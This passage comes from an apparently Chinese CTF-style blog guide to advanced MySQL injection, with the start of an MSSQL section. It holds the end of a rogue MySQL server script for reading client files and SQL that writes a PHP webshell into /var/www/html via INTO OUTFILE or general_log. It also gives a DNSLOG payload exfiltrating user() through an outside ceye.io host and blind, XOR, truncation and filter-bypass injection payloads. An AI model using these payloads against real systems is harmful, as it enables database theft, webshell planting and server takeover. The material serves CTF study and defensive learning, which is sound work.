'\xfe\x00\x00\x02\x00'                        ))                        raise LastPacket()                    elif packet.payload[0] in '\x02':                        self.push(mysql_packet(                            packet, '\0\0\0\x02\0\0\0'                        ))                        raise LastPacket()                    elif packet.payload == '\x00\x01':                        self.push(None)                        self.close_when_done()                    else:                        raise ValueError()                else:                    if self.sub_state == 'File':                        log.info('-- result')                        log.info('Result: %r', data)                        if len(data) == 1:                            self.push(                                mysql_packet(packet, '\0\0\0\x02\0\0\0')                            )                            raise LastPacket()                        else:                            self.set_terminator(3)                            self.state = 'LEN'                            self.order = packet.packet_num + 1                    elif self.sub_state == 'Auth':                        self.push(mysql_packet(                            packet, '\0\0\0\x02\0\0\0'                        ))                        raise LastPacket()                    else:                        log.info('-- else')                        raise ValueError('Unknown packet')            except LastPacket:                log.info('Last packet')                self.state = 'LEN'                self.sub_state = None                self.order = 0                self.set_terminator(3)            except OutOfOrder:                log.warning('Out of order')                self.push(None)                self.close_when_done()        else:            log.error('Unknown state')            self.push('None')            self.close_when_done()class mysql_listener(asyncore.dispatcher):    def __init__(self, sock=None):        asyncore.dispatcher.__init__(self, sock)        if not sock:            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)            self.set_reuse_addr()            try:                self.bind(('', PORT))            except socket.error:                exit()            self.listen(5)    def handle_accept(self):        pair = self.accept()        if pair is not None:            log.info('Conn from: %r', pair[1])            tmp = http_request_handler(pair)z = mysql_listener()daemonize()asyncore.loop()</code></pre><p>需要注意的是：这个过程需要客户端允许使用load data local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%875.png" alt=""></p><h4 id="4-3-写文件："><a href="#4-3-写文件：" class="headerlink" title="4-3.写文件："></a>4-3.写文件：</h4><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p><pre><code class="sql">select 1,"&lt;?php @assert($_POST['t']);?&gt;" into outfile '/var/www/html/1.php';select 2,"&lt;?php @assert($_POST['t']);?&gt;" into dumpfile '/var/www/html/1.php';</code></pre><p>限制：</p><ul><li>secure-file-priv无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，mysql的权限足够</li></ul><h5 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h5><p>由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。<br>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><pre><code>//请求日志mysql&gt; set global general_log_file = '/var/www/html/1.php';mysql&gt; set global general_log = on;//慢查询日志mysql&gt; set global slow_query_log_file='/var/www/html/2.php'mysql&gt; set global slow_query_log=1;//还有其他很多日志都可以进行利用...</code></pre><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h4 id="4-4-DNSLOG外带数据-目标系统为Windows才可用"><a href="#4-4-DNSLOG外带数据-目标系统为Windows才可用" class="headerlink" title="4-4.DNSLOG外带数据(目标系统为Windows才可用)"></a>4-4.DNSLOG外带数据(目标系统为Windows才可用)</h4><p>参考：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener" title="Dnslog在SQL注入中的实战">Dnslog在SQL注入中的实战</a><br>什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</p><p>如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%876.png" alt=""><br>payload: </p><pre><code>load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))</code></pre><p>应用场景：</p><ul><li>三大注入无法使用</li><li>有文件读取权限及secure-file-priv无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul><p>为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。<br>简单的说，在Windows中，路径以\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\中的两个\是用来进行转义处理的。</p><h2 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5.二次注入"></a>5.二次注入</h2><p>原理大概是服务器储存用户信息时，使用了addslashes()等函数转义用户输入的敏感字符，但取出用户信息时未做转义处理，从而引发二次注入<br>具体就不说了，网上讲解有很多</p><h2 id="6-堆叠注入"><a href="#6-堆叠注入" class="headerlink" title="6.堆叠注入"></a>6.堆叠注入</h2><p>原理就不说了，堆叠注入可以使用很多骚操作来绕过普通sql注入的限制，如函数预处理、函数自定义，handler查询等<br>函数预处理：参考<a href="http://pipinstall.cn/强网杯随便注/" target="_blank" rel="noopener" title="[强网杯]随便注">[强网杯]随便注</a><br>符号自定义：参考<a href="http://pipinstall.cn/suctf-2019easysql/" target="_blank" rel="noopener" title="[SUCTF 2019]EasySQL">[SUCTF 2019]EasySQL</a><br>handler语句代替select查询：参考<a href="http://pipinstall.cn/gyctf2020blacklist/" target="_blank" rel="noopener" title="[GYCTF2020]Blacklist">[GYCTF2020]Blacklist</a></p><p>PHP中堆叠注入的支持情况：<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%877.png" alt=""></p><h2 id="7-sql注入用到的常见函数-符号归类"><a href="#7-sql注入用到的常见函数-符号归类" class="headerlink" title="7.sql注入用到的常见函数/符号归类"></a>7.sql注入用到的常见函数/符号归类</h2><p>Yunen师傅总结得很全面，这里就直接照搬了：<a href="https://xz.aliyun.com/t/7169#toc-37" target="_blank" rel="noopener" title="传送门">传送门</a></p><h4 id="7-1-注释符"><a href="#7-1-注释符" class="headerlink" title="7-1.注释符"></a>7-1.注释符</h4><table><thead><tr><th>单行注释</th><th>单行注释</th><th>单行注释</th><th>多行(内联)注释</th></tr></thead><tbody><tr><td><code>#</code></td><td><code>-- x  //x为任意字符</code></td><td><code>;%00</code></td><td><code>/*任意内容*/</code></td></tr></tbody></table><h4 id="7-2-常用运算符"><a href="#7-2-常用运算符" class="headerlink" title="7-2.常用运算符"></a>7-2.常用运算符</h4><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and。</td><td>\</td><td>\</td><td></td><td>或，同or。</td></tr><tr><td>!</td><td>非，同not。</td><td>~</td><td>一元比特反转。</td></tr><tr><td>^</td><td>异或，同xor。</td><td>+</td><td>加，可替代空格，如<code>select+user()</code>。</td></tr></tbody></table><h4 id="7-3-系统信息函数"><a href="#7-3-系统信息函数" class="headerlink" title="7-3.系统信息函数"></a>7-3.系统信息函数</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同SCHEMA()。</td></tr><tr><td>VERSION()</td><td>获取当前版本信息。</td></tr></tbody></table><h4 id="7-4-进制转换"><a href="#7-4-进制转换" class="headerlink" title="7-4.进制转换"></a>7-4.进制转换</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值。</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code>。</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td></tr><tr><td>CHAR(N,... [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td></tr></tbody></table><h4 id="7-5-字符截取-拼接"><a href="#7-5-字符截取-拼接" class="headerlink" title="7-5.字符截取/拼接"></a>7-5.字符截取/拼接</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度。</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从<strong>最左边</strong>截取指定长度。</td></tr><tr><td>RPAD(str,len,padstr)</td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td></tr><tr><td>LPAD(str,len,padstr)</td><td>与RPAD相似，在<code>str</code>左边补齐。</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code>。</td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td></tr><tr><td>CONCAT(str1,str2...)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(...)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td>MAKE_SET(bits,str1,str2,...)</td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,'1','710'))</code>。</td></tr></tbody></table><h4 id="7-6-常见全局变量"><a href="#7-6-常见全局变量" class="headerlink" title="7-6.常见全局变量"></a>7-6.常见全局变量</h4><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p>#### 7-7.其他常用函数/语句<table><thead><tr><th>函数/语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度。</td></tr><tr><td>PI()</td><td>返回π的具体数值。</td></tr><tr><td>REGEXP "statement"</td><td>正则匹配数据，返回值为布尔值。</td></tr><tr><td>LIKE "statement"</td><td>匹配数据，%代表任意内容。返回值为布尔值。</td></tr><tr><td>RLIKE "statement"</td><td>与regexp相同。</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置。</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code>。</td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td></tr><tr><td>ELT(N,str1,str2,str3,...)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集。</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td></tr></tbody></table><h2 id="8-一些特殊的注入方式"><a href="#8-一些特殊的注入方式" class="headerlink" title="8.一些特殊的注入方式"></a>8.一些特殊的注入方式</h2><h4 id="8-1-order-by-大小比较盲注："><a href="#8-1-order-by-大小比较盲注：" class="headerlink" title="8-1.order by 大小比较盲注："></a>8-1.order by 大小比较盲注：</h4><p>参考链接：<a href="https://blog.csdn.net/miuzzx/article/details/104908543" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/104908543</a><br>使用条件：<br>当遇到的盲注题过滤了括号，且知道username和password的单独回显时，便可考虑使用该方法<br>例子：</p><pre><code>select * from users where (select 'r' union select user() order by 1 limit 1)='r'</code></pre><p>实际上此处是利用了order by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。<br>利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。</p><p>再举个例子：</p><pre><code class="mysql">select username,flag,password from users where username='$username;'</code></pre><p>页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？</p><p>我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join using()报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</p><p>使用order by可轻松盲注出答案。payload：</p><pre><code class="mysql">select username,flag,password from users where username='admin' union select 1,'a',3 order by 2</code></pre><p>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</p><h4 id="8-2-约束攻击"><a href="#8-2-约束攻击" class="headerlink" title="8-2.约束攻击"></a>8-2.约束攻击</h4><p>先举个例子：<br>建立一个用户表：做了25个字符的限制</p><pre><code class="sql">CREATE TABLE users(    username varchar(25),    password varchar(25))</code></pre><p>注册代码：</p><pre><code class="php">&lt;?php$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");if (!$conn) {    die("Connection failed: " . mysqli_connect_error());}$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']);$sql = "select * from users where username = '$username'";$rs = mysqli_query($conn,$sql);if($rs-&gt;fetch_row()){    die('账号已注册');}else{    $sql2 = "insert into users values('$username','$password')";    mysqli_query($conn,$sql2);    die('注册成功');}?&gt;</code></pre><p>登录判断代码：</p><pre><code class="php">&lt;?php$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");if (!$conn) {    die("Connection failed: " . mysqli_connect_error());}$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']);$sql = "select * from users where username = '$username' and password='$password';";$rs = mysqli_query($conn,$sql);if($rs-&gt;fetch_row()){    $_SESSION['username']=$password;}else{    echo "fail";}?&gt;</code></pre><p>上面的代码无编码问题，且对用户输入做了单引号处理，但是前边创建表格的语句限制了username和password的长度最大为20，若我们插入数据超过25，MYSQL则会截取前边的25个字符进行插入。</p><p>而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</p><p>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username=admin[25个空格]&amp;password=123456的账号，服务器会先查询admin[25个空格]x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username=admin[20个空格]&amp;password=123456。</p><p>接着进行登录的时，我们使用：username=admin&amp;password=123456进行登录，即可成功登录admin的账号。</p><p>防御：</p><ul><li>给username字段添加<a href="https://www.w3school.com.cn/sql/sql_unique.asp" target="_blank" rel="noopener" title="unique属性">unique属性</a>。</li><li>使用id字段作为判断用户的凭证。</li><li>插入数据前判断数据长度。</li></ul><h4 id="8-3-异或注入"><a href="#8-3-异或注入" class="headerlink" title="8-3.异或注入"></a>8-3.异或注入</h4><p>应用场景：<br>当我们在尝试SQL注入时,发现union,and和注释符被完全过滤掉了,那么就可以考虑使用异或注入<br>异或运算规则:<br>1^1=0 0^0=0 0^1=1<br>1^1^1=0 1^1^0=0<br>payload：’^ascii(mid(database(),1,1)=98)^0</p><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p><p>例题可参考<br><a href="http://pipinstall.cn/ciscn2019-华北赛区-day2-web1hack-world/" target="_blank" rel="noopener" title="[CISCN2019 华北赛区 Day2 Web1]Hack World">[CISCN2019 华北赛区 Day2 Web1]Hack World</a><br><a href="http://pipinstall.cn/网鼎杯2018unfinish/" target="_blank" rel="noopener" title="[网鼎杯2018]Unfinish">[网鼎杯2018]Unfinish</a></p><h4 id="8-4-regexp注入："><a href="#8-4-regexp注入：" class="headerlink" title="8-4.regexp注入："></a>8-4.regexp注入：</h4><p>这应该算一个小trick，就是在注入语句后面添加regexp+正则表达式来过滤查询出的内容<br>如：</p><pre><code class="mysql">(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#</code></pre><p>筛选出以f开头的结果<br>例题可参考<a href="http://pipinstall.cn/rctf2015easysql/" target="_blank" rel="noopener" title="[RCTF2015]EasySQL">[RCTF2015]EasySQL</a></p><h4 id="8-5-无列名注入："><a href="#8-5-无列名注入：" class="headerlink" title="8-5.无列名注入："></a>8-5.无列名注入：</h4><p>利用join进行无列名注入（利用union进行重命名）<br>这个在上面information_schema的Bypass已经讲过了，就不再重复了</p><p>通过select进行盲注<br>前边提到了，在知道表名，不知道列名的情况下，我们可以给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order by盲注之外，这里再提一种新的方法，直接通过select进行盲注。<br>核心payload：(select ‘admin’,’admin’)&gt;(select * from users limit 1)<br>子查询之间也可以直接通过&gt;、&lt;、=来进行判断。</p><p>例题参考：[GYCTF2020]Ezsqli</p><h4 id="8-6-Update-Insert-Delete注入"><a href="#8-6-Update-Insert-Delete注入" class="headerlink" title="8-6.Update/Insert/Delete注入"></a>8-6.Update/Insert/Delete注入</h4><p>上述三个注入一般出现在用户信息更新、用户信息添加和用户信息删除的业务中，通常配合报错注入，具体可参考其他大佬的说明，这里就不再赘述了</p><h4 id="8-7-反引号注入"><a href="#8-7-反引号注入" class="headerlink" title="8-7.反引号注入"></a>8-7.反引号注入</h4><p>反引号在sql注入中可起到分隔符（代替某些字段的空格，但用处不大）和注释符的作用<br>分隔符：</p><pre><code class="mysql">'union select1,2,group_concat(table_name) from`information_schema`.tables--+</code></pre><p>注释符：在某些情况下，`可当作注释符使用，如下<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%878.png" alt=""></p><h4 id="8-8-PDO场景下的SQL注入"><a href="#8-8-PDO场景下的SQL注入" class="headerlink" title="8-8.PDO场景下的SQL注入"></a>8-8.PDO场景下的SQL注入</h4><ul><li>堆叠<br><a href="https://xz.aliyun.com/t/3950#toc-0" target="_blank" rel="noopener" title="参考">参考</a><br>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入<br>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</li></ul><pre><code class="php">new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><ul><li>PDO预处理<br>PDO分为模拟预处理和非模拟预处理。</li></ul><p>​    模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p><p>​    非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。<br>模拟预处理代码：</p><pre><code class="php">&lt;?php$dbms='mysql';$host='192.168.27.61';$dbName='test';$user='root';$pass='root';$dsn="$dbms:host=$host;dbname=$dbName";try {     $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false));} catch (PDOException $e) {     echo $e;}$username = $_GET['username'];$sql = "select * from user where username = ?";$stmt = $pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$username);$stmt-&gt;execute();while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){     var_dump($row);     echo "&lt;br&gt;";}</code></pre><p>PDO在模拟预处理是将处理完的SQL语句发送给MySQL服务器</p><p>非模拟预处理代码，在$username = $_GET[‘username’];代码前增加$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</p><p>首先给MySQL服务器发送SQL语句模板，然后通过EXECUTE发送占位符参数给服务器</p><ul><li>PDO预处理模式的安全问题<br>当设置为模拟预处理模式，且直接拼接用户可控参数到sql语句时：</li></ul><ol><li>未将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，我们就可以使用堆叠注入</li><li>设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);时，可进行报错注入</li></ol><h2 id="9-sql注入一些小trick"><a href="#9-sql注入一些小trick" class="headerlink" title="9.sql注入一些小trick"></a>9.sql注入一些小trick</h2><h4 id="9-1-LIMIT之后的字段数判断"><a href="#9-1-LIMIT之后的字段数判断" class="headerlink" title="9-1.LIMIT之后的字段数判断"></a>9-1.LIMIT之后的字段数判断</h4><p>当注入点在limit之后，我们可以利用 into @,@ 判断字段数，其中@为mysql临时变量。<br>例子如下：<br>Sql语句：</p><pre><code class="php">$id=$_GET['id'];$sql="SELECT * FROM users WHERE id=1 LIMIT 0,1 into $id";</code></pre><p>Payload：?id=@<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%879.png" alt=""></p><p>Payload：?id=@,@,@<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%8710.png" alt=""><br>由此判断字段数为3</p><h4 id="9-2-通过正则回溯机制绕过-union-select-ig"><a href="#9-2-通过正则回溯机制绕过-union-select-ig" class="headerlink" title="9-2.通过正则回溯机制绕过/union.+?select/ig"></a>9-2.通过正则回溯机制绕过/union.+?select/ig</h4><p>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。此时我们就可以利用php的正则回溯机制绕过这个限制</p><p>故而我们构造payload：union/<em>100万个a，充当垃圾数据</em>/select即可绕过正则判断。</p><p>详情可参考P神的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener" title="PHP利用PCRE回溯次数限制绕过某些安全限制">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>当然，正则回溯次数限制的漏洞还有很多用处，不止于sql注入，具体情况看题目了</p><h4 id="9-3-group-by-列名-with-rollup绕过弱类型"><a href="#9-3-group-by-列名-with-rollup绕过弱类型" class="headerlink" title="9-3.group by 列名 with rollup绕过弱类型"></a>9-3.<em>group by 列名 with rollup</em>绕过弱类型</h4><p><a href="https://hack-for.fun/posts/20200412/#web10" target="_blank" rel="noopener">M0nk3y</a>师傅给我补充的小trick，学习一波</p><p>先上一个例子：</p><pre><code class="php">&lt;?php        $flag="";        function replaceSpecialChar($strParam){             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";             return preg_replace($regex,"",$strParam);        }        if (!$con)        {            die('Could not connect: ' . mysqli_error());        }        if(strlen($username)!=strlen(replaceSpecialChar($username))){            die("sql inject error");        }        if(strlen($password)!=strlen(replaceSpecialChar($password))){            die("sql inject error");        }        $sql="select * from user where username = '$username'";        $result=mysqli_query($con,$sql);            if(mysqli_num_rows($result)&gt;0){                    while($row=mysqli_fetch_assoc($result)){                        if($password==$row['password']){                            echo "登陆成功&lt;br&gt;";                            echo $flag;                        }                     }            }    ?&gt;</code></pre><p>题目前面做了一点限制，关键在后面，需要我们输入的password与查询出的结果相等（weak）才返回flag</p><p>payload：</p><pre><code class="mysql">'or/**/1=1/**/GROUP/**/BY/**/password/**/WITH/**/ROLLUP/**/LIMIT/**/1/**/OFFSET/**/1#</code></pre><p>payload解释：</p><ul><li><p>后面的limit…offset…自然不用多说，绕过逗号</p></li><li><p>在group by 列名 with rollup 中，倘若按列名分组后，列的属性值是不相同的，会生成一条分组条件的列为null的一条新的数据。而如果查询结果是唯一的，一会生成一条分组条件所在列为null的数据</p></li><li><p>所以我们可以通过with rollup使sql语句查询的password为null，然后不输入password，使我们的password为NULL，即可成功绕过最后的password判断</p></li></ul><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>Written by <a href="http://hackyangtuo.top/">小羊驼</a></p><p>前面ttpfx师傅写的Mysql的基本思路已经差不多够了，下面稍微总结一下mssql的一些</p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="系统库"><a href="#系统库" class="headerlink" title="系统库"></a>系统库</h3><table><thead><tr><th>系统数据库</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/master-database?view=sql-server-2017" target="_blank" rel="noopener">master 数据库</a></td><td>记录 SQL Server实例的所有系统级信息。这个数据库包括所有的配置信息、用户登录信息、当前正在服务器中运行的进程的信息。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/msdb-database?view=sql-server-2017" target="_blank" rel="noopener">msdb 数据库</a></td><td>用于 SQL Server 代理计划警报和作业。msdb数据库是SQL  Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一 个用户数据库。不同之处是SQL  Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL  Server Agent将会使用这个库。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/model-database?view=sql-server-2017" target="_blank" rel="noopener">model 数据库</a></td><td>用作 SQL Server实例上创建的所有数据库的模板。 对 <strong>model</strong>  数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL  Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/resource-database?view=sql-server-2017" target="_blank" rel="noopener">Resource 数据库</a></td><td>一个只读数据库，包含 SQL Server包括的系统对象。 系统对象在物理上保留在 <strong>Resource</strong> 数据库中，但在逻辑上显示在每个数据库的 <strong>sys</strong> 架构中。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/tempdb-database?view=sql-server-2017" target="_blank" rel="noopener">tempdb 数据库</a></td><td>一个工作空间，用于保存临时对象或中间结果集。tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL  Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到  tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL  Server重新启动，它都会清空tempdb数据库并重建◊永远不要在tempdb数据库建立需要永久保存的表。</td></tr></tbody></table><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><table><thead><tr><th>参数</th><th>风格</th></tr></thead><tbody><tr><td>/*</td><td>C语言风格</td></tr><tr><td>–</td><td>SQL注释风格</td></tr><tr><td>;%00</td><td>空字节</td></tr></tbody></table><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><h4 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h4><pre><code class="mssql">select @@SERVERNAME;</code></pre><h4 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h4><pre><code class="mssql">select @@VERSION</code></pre><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><pre><code class="mssql">select db_name()</code></pre><h4 id="数据库ip地址"><a href="#数据库ip地址" class="headerlink" title="数据库ip地址"></a>数据库ip地址</h4><pre><code class="mssql">select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</code></pre><h4 id="爆当前表中的列"><a href="#爆当前表中的列" class="headerlink" 